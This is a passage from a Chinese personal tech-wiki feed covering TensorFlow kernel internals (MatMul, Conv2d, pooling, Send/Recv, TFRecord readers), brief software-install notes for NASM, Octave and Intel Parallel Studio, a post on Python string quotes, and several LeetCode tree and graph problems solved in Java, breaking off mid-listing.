<p><img src="http://or9a8nskt.bkt.clouddn.com/15148889881424.jpg" alt=""></p>
<p>创建节点根据节点类型从注册的Ops工厂中生成，即TF通过工厂模式把一系列Ops注册到Ops工厂中。其中MatMul的注册函数为如下</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148889946670.jpg" alt=""></p>
<h3 id="4-3-3-MatMul正向计算"><a href="#4-3-3-MatMul正向计算" class="headerlink" title="4.3.3 MatMul正向计算"></a>4.3.3 MatMul正向计算</h3><p>MatMul的实现部分在core/kernels/matmul_op.cc文件中，类MatMulOp继承于<code>OpKernel</code>，成员函数Compute完成计算操作。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148890096198.jpg" alt=""></p>
<p>MatMul的测试用例core/kernels/matmul_op_test.cc文件，要调试这个测试用例，可通过如下方式：</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148890181645.jpg" alt=""></p>
<p>在TF中MatMul实现了CPU和GPU两个版本，其中CPU版本使用Eigen库，GPU版本使用cuBLAS库。</p>
<p>CPU版的MatMul使用Eigen库，调用方式如下：</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148890280195.jpg" alt=""></p>
<p>简而言之就是调用eigen的constract函数。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148890353345.jpg" alt=""></p>
<p>GPU版的MatMul使用cuBLAS库，准确而言是基于cuBLAS的stream_executor库。Stream executor是google开发的开源并行计算库，调用方式如下：</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148890463715.jpg" alt=""></p>
<p>其中stream类似于设备句柄，可以调用stream executor中的cuda模块完成运算。</p>
<h3 id="4-3-4-MatMul梯度计算"><a href="#4-3-4-MatMul梯度计算" class="headerlink" title="4.3.4 MatMul梯度计算"></a>4.3.4 MatMul梯度计算</h3><p>MatMul的梯度计算本质上也是一种kernel ops，描述为MatMulGrad。MatMulgrad操作是定义在grad_ops工厂中，类似于ops工厂。定义方式如下：</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148890640354.jpg" alt=""></p>
<p>MatmulGrad由FDH（Function Define Helper）完成定义，</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148890728382.jpg" alt=""></p>
<p>其中attr_adj_x=”transpose_a” ax0=false, ax1=true, attr_adj_y= “transpose_b”, ay0=true, ay1=false, *g属于FunctionDef类，包含MatMul的梯度定义。</p>
<p>从FDH定义中可以看出MatMulGrad本质上还是MatMul操作。在矩阵求导运算中：</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148890890660.jpg" alt=""></p>
<p>MatMulGrad的测试用例core/ops/math_grad_test.cc文件，要调试这个测试用例，可通过如下方式：</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148890938124.jpg" alt=""></p>
<h2 id="4-4-Conv2d"><a href="#4-4-Conv2d" class="headerlink" title="4.4 Conv2d"></a>4.4 Conv2d</h2><p>关于conv2d的python调用部分和C++创建部分可参考MatMul中的描述。</p>
<h3 id="4-4-1-Conv2d正向计算部分"><a href="#4-4-1-Conv2d正向计算部分" class="headerlink" title="4.4.1 Conv2d正向计算部分"></a>4.4.1 Conv2d正向计算部分</h3><p>TF中conv2d接口如下所示，简单易用：</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148891413185.jpg" alt=""></p>
<p>实现部分在<code>core/kernels/conv_ops.cc</code>文件中，类Conv2DOp继承于抽象基类<code>OpKernel</code>。<br>Conv2DOp的测试用例<code>core/kernels/eigen_spatial_convolutions_test.cc</code>文件，要调试这个测试用例，可通过如下方式：</p>
<p>Conv2DOp的成员函数Compute完成计算操作。</p>
<p><code>Conv2Dop::Compute(OpKernelContect* context)</code></p>
<p>为方便描述，假设tf.nn.conv2d中input参数的shape为[batch, in_rows, in_cols, in_depth]，filter参数的shape为[filter_rows, filter_cols, in_depth, out_depth]。</p>
<p>首先，计算卷积运算后输出tensor的shape。</p>
<p>Ø  若padding=VALID，output_size = (input_size - filter_size + stride) / stride;</p>
<p>Ø  若padding=SAME，output_size = (input_size + stride - 1) / stride;</p>
<p>其次，根据计算结果给输出tensor分配内存。</p>
<p>然后，开始卷积计算。Conv2DOp实现了CPU和GPU两种模式下的卷积运算。同时，还需要注意input tensor的输入格式，通常有NHWC和NCHW两种格式。在TF中，Conv2d-CPU模式下目前仅支持NHWC格式，即[Number, Height, Weight, Channel]格式。Conv2d-GPU模式下以NCHW为主，但支持将NHWC转换为NCHW求解。C++中多维数组是row-major顺序存储的，而Eigen默认是col-major顺序的，则C++中[N, H, W, C]相当于Eigen中的[C, W, H, N]，即dimention order是相反的，需要特别注意。</p>
<p>Conv2d-CPU模式下调用Eigen库函数。</p>
<p>Eigen库中卷积函数的详细代码参见图 4 2。</p>
<p>图 4 2 Eigen卷积运算的定义</p>
<p>Ø  Tensor::extract_image_patches() 为卷积或池化操作抽取与kernel size一致的image patches。该函数的定义在eigen3/unsupported/Eigen/CXX11/src/Tensor/ TensorBase.h中，参考该目录下ReadME.md。</p>
<p>Ø  Tensor::extract_image_patches() 的输出与input tensor的data layout有关。设input tensor为ColMajor格式[NHWC]，则image patches输出为[batch, filter_index, filter_rows, filter_cols, in_depth]，并reshape为[batch <em> filter_index, filter_rows </em> filter_cols <em> in_depth]，而kernels维度为[filter_rows </em> filter_cols <em> in_depth, out_depth]，然后kernels矩阵乘image patches得到输出矩阵[batch </em> filter_index, out_depth]，并reshape为[batch, out_rows, out_cols, out_depth]。</p>
<p>Conv2d-GPU模式下调用基于cuDNN的stream_executor库。若input tensor为NHWC格式的，则先转换为NCHW格式</p>
<p>调用cudnn库实现卷积运算：</p>
<p>计算完成后再转换成HHWC格式的</p>
<p>4.4.2 Conv2d梯度计算部分</p>
<p>Conv2D梯度计算公式，假设output=Conv2d(input, filter)，则</p>
<p>Conv2D梯度计算的测试用例core/kernels/eigen_backward_spatial_convolutions_test.cc文件，要调试这个测试用例，可通过如下方式：</p>
<p>Conv2d的梯度计算函数描述为Conv2DGrad。Conv2DGrad操作定义在grad_ops工厂中。注册方式如下：</p>
<p>Conv2DGrad由FDH（Function Define Helper）完成定义，参见图 4 3。</p>
<p>图 4 3 Conv2DGrad的函数定义</p>
<p>Conv2DGrad梯度函数定义中依赖Conv2DBackpropInput和Conv2DBackpropFilter两种Ops，二者均定义在kernels/conv_grad_ops.cc文件中。</p>
<p>Conv2DBackpropInputOp和Conv2DBackpropFilterOp的实现分为GPU和CPU版本。</p>
<p>Conv2D运算的GPU版实现定义在类Conv2DSlowBackpropInputOp和类Conv2DSlowBackprop FilterOp 中。</p>
<p>Conv2D运算的CPU版有两种实现形式，分别为custom模式和fast模式。Custom模式基于贾扬清在caffe中的思路实现，相关类是Conv2DCustomBackpropInputOp和Conv2DCustomBackpropFilterOp。Fast模式基于Eigen计算库，由于在GPU下会出现nvcc编译超时，目前仅适用于CPU环境，相关类是Conv2DFastBackpropInputOp和Conv2DFastBackpropFilterOp。 </p>
<p>根据Conv2DGrad的函数定义，从代码分析Conv2D-GPU版的实现代码，即分析Conv2DBackpropInput和Conv2DBackpropFilter的实现方式。</p>
<p>Conv2DSlowBackpropInputOp的成员函数Compute完成计算操作。</p>
<p>Compute实现部分调用stream executor的相关函数，需要先获取库的stream句柄，再调用卷积梯度函数。</p>
<p>stream executor在卷积梯度运算部分仍然是借助cudnn库实现的。</p>
<p>4.4.3 MaxPooling计算部分</p>
<p>在很多图像分类和识别问题中都用到了池化运算，池化操作主要有最大池化（max pooling）和均值池化（avg pooling），本章节主要介绍最大池化的实现方法。调用TF接口可以很容易实现池化操作。</p>
<p>类MaxPoolingOp继承于类<code>OpKernel</code>，成员函数Compute实现了最大池化运算。</p>
<p>最大池化运算调用Eigen库实现。</p>
<p>Eigen库中最大池化的详细描述如下：</p>
<p>其中最大池化运算主要分为两步，第一步中extract_image_patch为池化操作抽取与kernel size一致的image patches，第二步计算每个image patch的最大值。</p>
<p>4.5 SendOp &amp; RecvOp</p>
<p>TF所有操作都是节点形式表示的，包括计算节点和非计算节点。在跨设备通信中，发送节点（SendOp）和接收节点（RecvOp）为不同设备的两个相邻节点完成完成数据通信操作。Send和Recv通过TCP或RDMA来传输数据。</p>
<p>TF采用Rendezvous（回合）通信机制，Rendezvous类似生产者/消费者的消息信箱。引用TF描述如下：</p>
<p>TF的消息传递属于采用“发送不阻塞/接收阻塞”机制，实现场景有LocalRendezvous<br>（本地消息传递）、RpcRemoteRendezvous (分布式消息传递)。除此之外还有IntraProcessRendezvous用于本地不同设备间通信。</p>
<p>TF会在不同设备的两个相邻节点之间添加Send和Recv节点，通过Send和Recv之间进行通信来达到op之间通信的效果，如图 4 4右子图所示。图中还涉及到一个优化问题，即a-&gt;b和a-&gt;c需要建立两组send/recv连接的，但两组连接是可以共用的，所以合并成一组连接。</p>
<p>图 4 4 Graph跨设备通信</p>
<p>Send和Recv分别对应<code>OpKernel</code>中的SendOp和RecvOp两个类(kernels/sendrecv_ops.h)。<br>SendOp的计算函数。</p>
<p>SendOp作为发送方需要先获取封装ctx消息，然后借助Rendezvous模块发送给接收方。</p>
<p>RecvOp的计算函数如下。</p>
<p>RecvOp作为接收方借助Rendezvous模块获取ctx消息。</p>
<p>其中parsed变量是类ParsedKey的实例。图 5‑5是Rendezvous封装的ParsedKey消息实体示例。</p>
<p>4.6 ReaderOp &amp; QueueOp</p>
<p>4.6.1 TF数据读取</p>
<p>TF系统定义了三种数据读取方式[13]：</p>
<p>Ø  供给数据(Feeding)： 在TensorFlow程序运行的每一步， 通过feed_dict来供给数据。</p>
<p>Ø  从文件读取数据： 在TensorFlow图的起始， 让一个输入管线（piplines）从文件中读取数据放入队列，通过QueueRunner供给数据，其中队列可以实现多线程异步计算。</p>
<p>Ø  预加载数据： 在TensorFlow图中定义常量或变量来保存所有数据，如Mnist数据集（仅适用于数据量比较小的情况）。</p>
<p>除了以上三种数据读取方式外，TF还支持用户自定义数据读取方式，即继承ReaderOpKernel类创建新的输入读取类[14]。本章节主要讲述通过piplines方式读取数据的方法。</p>
<p>Piplines利用队列实现异步计算</p>
<p>从piplines读取数据也有两种方式：一种是读取所有样本文件路径名转换成string tensor，使用input_producer将tensor乱序（shuffle）或slice（切片）处理放入队列中；另一种是将数据转化为TF标准输入格式，即使用TFRecordWriter将样本数据写入tfrecords文件中，再使用TFRecordReader将tfrecords文件读取到队列中。</p>
<p>图 4 6描述了piplines读取数据的第一种方式，这些流程通过节点和边串联起来，成为graph数据流的一部分。</p>
<p>从左向右，第一步是载入文件列表，使用convert_to_tensor函数将文件列表转化为tensor，如cifar10数据集中的image_files_tensor和label_tensor。</p>
<p>第二步是使用input_producer将image_files_tensor和label_tensor放入图中的文件队列中，这里的input_producer作用就是将样本放入队列节点中，有string_input_producer、range_input_producer和slice_input_producer三种，其中slice_input_producer的切片功能支持乱序，其他两种需要借助tf.train.shuffle_batch函数作乱序处理，有关三种方式的具体描述可参考tensorflow/python/training/input.py注释说明。</p>
<p>第三步是使用tf.read_file()读取队列中的文件数据到内存中，使用解码器如tf.image.decode_jpeg()解码成[height, width, channels]格式的数据。</p>
<p>最后就是使用batch函数将样本数据处理成一批批的样本，然后使用session执行训练。</p>
<p>图 4 6 使用piplines读取数据</p>
<p>4.6.2 TFRecords使用</p>
<p>TFRecords是TF支持的标准文件格式，这种格式允许将任意的数据转换为TFRecords支持的文件格式。TFRecords方法需要两步：第一步是使用TFRecordWriter将样本数据写入tfrecords文件中，第二步是使用TFRecordReader将tfrecords文件读取到队列中。</p>
<p>图 4 7是TFRecords文件写入的简单示例。tf.train.Example将数据填入到Example协议内存块(protocol buffer)，将协议内存块序列化为一个字符串，通过TFRecordWriter写入到TFRecords文件，图中定义了label和image_raw两个feature。Example协议内存块的定义请参考文件core/example/example.proto。</p>
<p>图 4 7 TFRecordWriter写入数据示例</p>
<p>图 4 8是TFRecords文件读取的简单示例。tf.parse_single_example解析器将Example协议内存块解析为张量，放入example队列中，其中features命名和类型要与Example写入的一致。</p>
<p>图 4 8 TFRecrodReader读取数据示例</p>
<p>4.6.3 ReaderOps分析</p>
<p>ReaderOpsKernel类封装了数据读取的入口函数Compute，通过继承ReaderOpsKernel类可实现各种自定义的数据读取方法。图 4 9是ReaderOp相关的UML视图。</p>
<p>图 4 9 ReaderOp相关的UML视图</p>
<p>ReaderOpKernel子类必须重新定义成员函数SetReaderFactory实现对应的数据读取逻辑。TFRecordReaderOp的读取方法定义在TFRecordReader类中。</p>
<p>TFRecordReader调用RecordReader::ReadRecord()函数逐步读取.tfrecord文件中的数据，每读取一次，offset向后移动一定长度。</p>
<p>其中offset的计算方式。</p>
]]></content>
      
        <categories>
            
            <category> TensorFlow </category>
            
        </categories>
        
        
        <tags>
            
            <tag> tensorflow </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Nasm]]></title>
      <url>/wiki/2017/12/11/awesome-Install-nasm/</url>
      <content type="html"><![CDATA[<p><code>NASM</code>是一款开源的汇编语言编译器，官网地址为<a href="http://www.nasm.us">http://www.nasm.us</a>.</p>
<h2 id="编译命令"><a href="#编译命令" class="headerlink" title="编译命令"></a>编译命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasm −f &lt;format&gt; &lt;filename&gt; [−o &lt;output&gt;]</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> awesome Install </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Octave]]></title>
      <url>/wiki/2017/12/10/awesome-Install-octave/</url>
      <content type="html"><![CDATA[<p><code>Octave</code>几乎完全模仿了<code>Matlab</code>的基本功能，其目的是做一个开源的、可扩展的<code>Matlab</code>, 两者相似率在95%以上。所以使用<code>Octave</code>基本不用担心兼容性的问题，而且<code>Octave</code>的开源使其更收到科学计算社区的欢迎。</p>
<p>在<code>Mac</code>上可以直接使用图形界面进行操作，就像<code>Matlab</code>一样。下载链接在<a href="http://wiki.octave.org/Octave_for_macOS">Octave for macOS</a>页面上的 <em>download Octave 4.0.3 with graphical user interface</em> 。</p>
<p>软件界面如下，是不是非常像<code>Matlab</code>呢？</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/octave_interface.png" alt="octave_interface"></p>
]]></content>
      
        <categories>
            
            <category> awesome Install </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Intel Parallel Studio XE]]></title>
      <url>/wiki/2017/12/03/awesome-Install-Intel-Parallel-Studio-XE/</url>
      <content type="html"><![CDATA[<p>Intel Paralle Studio 对于学生是可以免费申请的，点击<a href="https://software.intel.com/en-us/qualify-for-free-software/student">这里</a>填上你的学校邮箱及相关信息即可。</p>
<p>申请界面如下，点击下面的<code>mac os</code>选项即可。<br><img src="http://or9a8nskt.bkt.clouddn.com/free.png" alt="free"></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>下载软件后，像安装一般软件一样，点击安装一步步往下走即可，在安装过程中需要输入申请到的激活码。</p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>以最新的2018 Release为例, 安装好以后在<code>.bashrc</code>中加上如下语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#intel</span><br><span class="line">source /opt/intel/compilers_and_libraries_2018.0.104/mac/bin/compilervars.sh intel64</span><br><span class="line">source /opt/intel/compilers_and_libraries_2018.0.104/mac/mkl/bin/mklvars.sh intel64</span><br></pre></td></tr></table></figure>
<p>这样即配置好了相关的<code>IFORT</code>编译器以及<code>MKL</code>库。运行<code>ifort</code>命令和<code>-mkl</code>选项测试:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ifort fortran_file.f90 -mkl</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> awesome Install </category>
            
        </categories>
        
        
        <tags>
            
            <tag> IFORT </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[112. Path Sum]]></title>
      <url>/wiki/2017/10/30/Leetcode-112-Path-Sum/</url>
      <content type="html"><![CDATA[<p>Given a binary tree and a sum, determine if the tree has a root-to-leaf path such that adding up all the values along the path equals the given sum.</p>
<p>Note: A leaf is a node with no children.</p>
<p>Example:</p>
<p>Given the below binary tree and <code>sum = 22</code>,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">      5</span><br><span class="line">     / \</span><br><span class="line">    4   8</span><br><span class="line">   /   / \</span><br><span class="line">  11  13  4</span><br><span class="line"> /  \      \</span><br><span class="line">7    2      1</span><br></pre></td></tr></table></figure>
<p>return true, as there exist a root-to-leaf path <code>5-&gt;4-&gt;11-&gt;2</code> which sum is 22.</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>递归吧，这道题目唯一需要注意的就是判断该节点为叶子节点。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasPathSum</span><span class="params">(TreeNode root, <span class="keyword">int</span> sum)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (root.left == <span class="keyword">null</span> &amp;&amp; root.right == <span class="keyword">null</span>)  <span class="keyword">return</span> sum == root.val; <span class="comment">//叶子节点</span></span><br><span class="line">    <span class="keyword">int</span> newSum = sum - root.val;</span><br><span class="line">    <span class="keyword">return</span> hasPathSum(root.left, newSum) || hasPathSum(root.right, newSum);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Depth-first Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python引号]]></title>
      <url>/wiki/2017/10/30/Python-python%E5%BC%95%E5%8F%B7/</url>
      <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/woainishifu/article/details/76105667">https://blog.csdn.net/woainishifu/article/details/76105667</a></p>
<p>Python中单引号，双引号，3个单引号及3个双引号的区别<br>2017年07月26日 10:21:23 邓无邪 阅读数：37124更多<br>个人分类： Python<br>版权声明：本文为博主原创文章，未经博主允许不得转载。    <a href="https://blog.csdn.net/woainishifu/article/details/76105667">https://blog.csdn.net/woainishifu/article/details/76105667</a><br>单引号和双引号<br>在Python中我们都知道单引号和双引号都可以用来表示一个字符串，比如</p>
<p>str1 = ‘python’<br>str2 = “python”<br>str1和str2是没有任何区别的。</p>
<p>我们知道Python以其易用性而著名，所以刚开始看教程学习看到单引号和双引号都可以使用会以为这是Python为了方便程序员，随便用哪个就好，不用担心用错。其实，背后的原因不只是这么简单。举个例子，想想I’m a big fans of Python.这个字符串应该怎么定义。</p>
<p>单引号版本：</p>
<p>str3 = ‘I\’m a big fan of Python.’<br>可以注意到，原来的字符串中有一个’，而Python又允许使用单引号’ ‘来表示字符串，所以字符串中间的’必须用转移字符\才可以。字符串中间只有一个’，这样写看起来还好，但是如果是We all know that ‘A’ and ‘B’ are two capital letters.这个字符串呢？<br>str4 = ‘We all know that \’A\’ and \’B\’ are two capital letters.’<br>怎么样，是不是看起来就很不好看，而且很容易出错了？这个时候就是双引号也可以表示字符串该体现作用的时候了。下面是str4的双引号版本：</p>
<p>str4_ = “We all know that ‘A’ and ‘B’ are two capital letters.”<br>这样是不是看起来就人性化多了？没错，这就是Python支持双引号和单引号都能用来定义字符串的原因。</p>
<p>反之，如果字符串中有双引号，为了避免使用转义符，你可以使用单引号来定义这个字符串。比如：</p>
<p>str5 = ‘The teacher said: “Practice makes perfect” is a very famous proverb.’<br>这就是Python易用性和人性化的一个极致体现，当你用单引号’ ‘定义字符串的时候，它就会认为你字符串里面的双引号” “是普通字符，从而不需要转义。反之当你用双引号定义字符串的时候，就会认为你字符串里面的单引号是普通字符无需转义。</p>
<p>3个单引号及3个双引号<br>实际上3个单引号和3个双引号不经常用，但是在某些特殊格式的字符串下却有大用处。通常情况下我们用单引号或者双引号定义一个字符串的时候只能把字符串连在一起写成一行，如果非要写成多行，就得在每一行后面加一个\表示连字符，比如：</p>
<p>str1 = “List of name:\<br>        Hua Li\<br>        Chao Deng”<br>而且即使你这样写也不能得到期望的输出：</p>
<p>List of name:<br>Hua Li<br>Chao Deng<br>实际上输出是下面这样的：</p>
<blockquote>
<blockquote>
<blockquote>
<p>str1 = “List of name:\<br>…         Hua Li\<br>…         Chao Deng”<br>print(str1)<br>List of name:        Hua Li        Chao Deng</p>
</blockquote>
</blockquote>
</blockquote>
<p>那么该如何得到我们期望的一行一个名字的输出格式呢？这就是3个引号的作用了：</p>
<blockquote>
<blockquote>
<blockquote>
<p>str1 = “””List of name:<br>… Hua Li<br>… Chao Deng<br>… “””<br>print(str1)<br>List of name:<br>Hua Li<br>Chao Deng</p>
</blockquote>
</blockquote>
</blockquote>
<p>虽然我们也可以通过给字符串加上\n实现：</p>
<blockquote>
<blockquote>
<blockquote>
<p>str1 = “List of name:\nHua Li\nChao Deng”<br>print(str1)<br>List of name:<br>Hua Li<br>Chao Deng<br>但是这样在输入的时候看起来就乱了很多不是么？所以这种情况下尽量使用3个引号，至于3个单引号还是双引号都是一样的，只需要注意如果字符串中包含有单引号就要使用双引号来定义就好了。</p>
</blockquote>
</blockquote>
</blockquote>
<p>而且使用3个引号还有一个特别棒的作用就是：加注释！</p>
<blockquote>
<blockquote>
<blockquote>
<p>str1 = “””<br>… List of name:<br>… Hua Li # LiHua<br>… Chao Deng # DengChao<br>… “””<br>print(str1)</p>
</blockquote>
</blockquote>
</blockquote>
<p>List of name:<br>Hua Li # LiHua<br>Chao Deng # DengChao<br>如果要实现这种输出效果，仅仅使用单引号或者双引号还能实现吗？</p>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[404. Sum of Left Leaves]]></title>
      <url>/wiki/2017/10/30/Leetcode-404-Sum-of-Left-Leaves/</url>
      <content type="html"><![CDATA[<p>Find the sum of all left leaves in a given binary tree.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  3</span><br><span class="line"> / \</span><br><span class="line">9  20</span><br><span class="line">  /  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure>
<p>There are two left leaves in the binary tree, with values 9 and 15 respectively. Return 24.</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>如果是求所有叶子结点的和会比较简单，为了区分左叶子结点和右叶子节点，特别的，在参数列表上增加了<code>isLeft</code>参数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> sum;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">sumOfLeftLeaves</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    sumOfLeftLeavesHelper(root, <span class="keyword">false</span>); </span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sumOfLeftLeavesHelper</span><span class="params">(TreeNode root, <span class="keyword">boolean</span> isLeft)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (root.left == <span class="keyword">null</span> &amp;&amp; root.right == <span class="keyword">null</span> &amp;&amp; isLeft) sum += root.val;</span><br><span class="line">    sumOfLeftLeavesHelper(root.left, <span class="keyword">true</span>);</span><br><span class="line">    sumOfLeftLeavesHelper(root.right, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[401. Binary Watch]]></title>
      <url>/wiki/2017/10/30/Leetcode-401-Binary-Watch/</url>
      <content type="html"><![CDATA[<p>A binary watch has 4 LEDs on the top which represent the hours (0-11), and the 6 LEDs on the bottom represent the minutes (0-59).</p>
<p>Each LED represents a zero or one, with the least significant bit on the right.</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15275049224238.jpg" alt=""></p>
<p>For example, the above binary watch reads “3:25”.</p>
<p>Given a non-negative integer $n$ which represents the number of LEDs that are currently on, return all possible times the watch could represent.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: n = 1</span><br><span class="line">Return: [&quot;1:00&quot;, &quot;2:00&quot;, &quot;4:00&quot;, &quot;8:00&quot;, &quot;0:01&quot;, &quot;0:02&quot;, &quot;0:04&quot;, &quot;0:08&quot;, &quot;0:16&quot;, &quot;0:32&quot;]</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>The order of output does not matter.</li>
<li>The hour must not contain a leading zero, for example “01:00” is not valid, it should be “1:00”.</li>
<li>The minute must be consist of two digits and may contain a leading zero, for example “10:2” is not valid, it should be “10:02”.</li>
</ul>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Backtracking </tag>
            
            <tag> Leetcode </tag>
            
            <tag> Bit-Manipulation </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[399. Evaluate Division]]></title>
      <url>/wiki/2017/10/30/Leetcode-399-Evaluate-Division/</url>
      <content type="html"><![CDATA[<p>Equations are given in the format <code>A / B = k</code>, where <code>A</code> and <code>B</code> are variables represented as strings, and <code>k</code> is a real number (floating point number). Given some queries, return the answers. If the answer does not exist, return <code>-1.0</code>.</p>
<p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Given a / b = 2.0, b / c = 3.0. </span><br><span class="line">queries are: a / c = ?, b / a = ?, a / e = ?, a / a = ?, x / x = ? . </span><br><span class="line">return [6.0, 0.5, -1.0, 1.0, -1.0 ].</span><br></pre></td></tr></table></figure></p>
<p>The input is: <code>String[][] equations, double[] values, String[][] queries</code> , where <code>equations.size() == values.size()</code>, and the values are positive. This represents the equations. Return <code>double[]</code>.</p>
<p>According to the example above:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">equations = [ [&quot;a&quot;, &quot;b&quot;], [&quot;b&quot;, &quot;c&quot;] ],</span><br><span class="line">values = [2.0, 3.0],</span><br><span class="line">queries = [ [&quot;a&quot;, &quot;c&quot;], [&quot;b&quot;, &quot;a&quot;], [&quot;a&quot;, &quot;e&quot;], [&quot;a&quot;, &quot;a&quot;], [&quot;x&quot;, &quot;x&quot;] ].</span><br></pre></td></tr></table></figure>
<p>The input is always valid. You may assume that evaluating the queries will result in no division by zero and there is no contradiction.</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目的难点在于发现可以用图论解决。对于方程<code>A/B = C</code>，可以把A、B视为图的节点，AB构成图的一条边，C为边的权重。以这种方式构建有向图，那么对于任意方程<code>x/y</code>的问题可以转化为<em>在有向图中，是否存在一条路径$x-y$，如果存在则返回路径的权重</em>。可以用DFS解决，时间复杂度为$O(Q\times(E+V))$，其中$Q$为查询的数量，$E$为方程数量，$V$为方程中字母的数量。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 